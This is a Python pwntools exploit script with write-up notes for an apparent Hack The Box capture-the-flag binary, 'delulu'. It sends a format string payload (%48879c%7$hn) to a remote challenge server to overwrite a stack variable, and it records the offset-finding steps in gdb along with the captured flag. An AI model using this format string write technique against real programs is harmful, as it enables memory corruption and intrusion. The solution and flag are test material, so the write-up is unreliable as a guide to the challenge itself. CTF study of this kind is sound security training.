#!/usr/bin/env python3

from pwn import *

exe = './delulu'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#p = process(exe)
p = remote('83.136.250.41',47976)

payload = b'%48879c%7$hn'

p.sendlineafter(b'>> ',payload)
p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
need to overwrite the variable value 0x1337babe with the value 0x1337beef, so no need to hijack control flow or anything of check the canary. Once we overwrite the variable it compares it with 0x1337beef and if it is correct it prints the flag

We have a variable that is the pointer to the variable we have to overwrite so if we overwrite the value of that location to 0x1337beef we are good to go
run in gdb, five the input %p.%p.%p.%p.%p.%p.%p.%p

[!] Checking.. 0x7fffffffbb10.(nil).0x7ffff7d14887.0x10.0x7fffffff.0x1337babe.0x7fffffffdc30.0x70252e70252e7025
Variable is at 6 so the address might be at offset 7
Put a breakpoint before the printf call
When we do %n to overwrite, we are suppyling an address to var we are overwriting so we need pointer to the var we are overwriting 

to check what the address after our variable points to do
# x/gx 0x7fffffffdc30 and we can see its poiting to  0x7fffffffdc30:0x000000001337babe
We only need to overwrite the lower bytes, so need to write beef
in gdb 
# p 0xbeef = 48879 (decimal value of 0xbeef)

%48879c
%c is a width modifier so its going to write the number of spaces we provide it. Number of spaces correspond to the value in decimal we want to overwrite

We are only overwriting 2 bytes so %hn and %hhn is to write 1 byte
%48879c%hn

The offset is 7 so payload is
%48879c%7$hn
Flag : HTB{m45t3r_0f_d3c3pt10n}
'''
